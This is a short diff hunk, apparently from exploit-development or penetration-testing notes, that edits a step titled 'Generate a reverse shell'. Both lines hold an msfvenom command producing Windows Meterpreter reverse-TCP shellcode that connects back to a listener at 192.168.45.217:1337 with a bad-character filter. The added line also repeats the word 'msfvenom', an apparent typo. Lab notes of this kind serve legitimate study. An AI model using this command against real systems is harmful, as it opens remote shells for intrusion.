@@ -281,7 +281,7 @@ Generate a reverse shell.
 
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.217 LPORT=1337 -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+msfvenom msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.217 LPORT=1337 -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d" EXITFUNC=thread
 ```
 
 
